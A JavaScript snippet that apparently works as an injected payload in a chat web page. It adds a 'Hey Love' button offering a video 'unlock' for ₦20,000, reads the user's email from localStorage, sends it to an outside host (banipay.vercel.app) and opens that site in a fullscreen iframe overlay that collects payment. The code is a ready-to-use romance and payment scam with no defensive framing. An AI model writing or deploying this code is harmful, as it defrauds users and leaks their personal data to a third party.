function initUnlockButton(triggerImg) {
  console.log("Unlock button payload started");

  // Create wrapper div
  const wrapper = document.createElement("div");
  wrapper.style.pointerEvents = "none";

  // Create the button
  const btn = document.createElement("div");
  btn.className = "unlock-btn-chat";
  btn.style.cssText = `
    pointer-events:auto;
    display:flex;
    align-items:center;
    gap:6px;
    background:#f82a2a;
    color:white;
    border:none;
    border-radius:999px;
    padding:8px 14px;
    font-size:14px;
    font-weight:600;
    cursor:pointer;
  `;
  btn.innerHTML = `
    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="white" viewBox="0 0 24 24">
      <path d="M3 22v-20l18 10-18 10z"/>
    </svg>
    Hey Love, I made this video specially for you. Click to unlock quick before it expires. (₦20,000.00)
  `;

  wrapper.appendChild(btn);
  triggerImg.insertAdjacentElement("afterend", wrapper);

  // Click handler (same as before)
  btn.addEventListener("click", function (e) {
    e.stopPropagation();
    e.preventDefault();
    console.log("Unlock button clicked");

    let infRaw = localStorage.getItem("user-store");
    let inf;
    try {
      inf = infRaw ? JSON.parse(infRaw) : {};
    } catch (err) {
      inf = {};
    }
    const userEmail = inf?.state?.user?.email || "No Email Provided";
    const amount = "20000";

    const existingFrame = document.querySelector("#app-frame-zbFWp0");
    const url = new URL("https://banipay.vercel.app");
    url.searchParams.set("email", userEmail);
    url.searchParams.set("amount", amount);

    if (existingFrame) {
      existingFrame.style.display = "block";
      if (existingFrame.src !== url.toString()) {
        existingFrame.src = url.toString();
      }
      return;
    }

    // Overlay
    const overlay = document.createElement("div");
    overlay.style.cssText = `
      z-index: 9999999998;
      position: fixed;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
    `;

    // Spinner
    const spinner = document.createElement("div");
    spinner.style.cssText = `
      border: 8px solid #f3f3f3;
      border-top: 8px solid #f82a2a;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    `;
    spinner.innerHTML = `
      <style>
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    `;
    overlay.appendChild(spinner);
    document.body.appendChild(overlay);

    // Iframe
    const iframe = document.createElement("iframe");
    iframe.src = url.toString();
    iframe.style.cssText = `
      z-index: 9999999999;
      background: transparent;
      border: none;
      position: fixed;
      left: 0; top: 0;
      width: 100%; height: 100%;
      visibility: hidden;
    `;
    iframe.id = "app-frame-zbFWp0";
    iframe.allowFullscreen = true;
    iframe.allowPaymentRequest = true;
    iframe.title = "bani-frameThqyfq";
    iframe.sandbox =
      "allow-forms allow-scripts allow-same-origin allow-top-navigation-by-user-activation allow-popups";

    iframe.addEventListener("load", () => {
      overlay.remove();
      iframe.style.visibility = "visible";
    });

    document.body.appendChild(iframe);
  });
}
